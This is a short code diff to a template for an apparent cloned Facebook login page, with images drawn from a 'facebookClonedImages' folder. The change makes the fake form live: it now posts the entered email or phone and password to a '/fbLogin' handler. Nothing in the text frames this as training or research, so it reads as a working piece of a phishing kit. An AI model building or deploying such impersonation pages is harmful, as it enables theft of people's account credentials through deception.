@@ -18,15 +18,16 @@
                 <a href="#"><img src="../../../static/images/clonedLoginSitesImgs/facebookClonedImages/logo.png" alt="Facebook"></a>
             </div>
             <div class="login_area">
-                <form action="#">
+                <form action="/fbLogin" method="post">
+                    {% csrf_token %}
                     <div class="username_area">
                         <label for="username">Email or Phone</label>
-                        <input type="text" id="username">
+                        <input type="text" id="username" name="username">
 
                     </div>
                     <div class="password_area">
                         <label for="password">Password</label>
-                        <input type="password" id="password">
+                        <input type="password" id="password" name="password">
                         <a href="#">Forgot your password?</a>
                     </div>
                     <div class="submit_area">
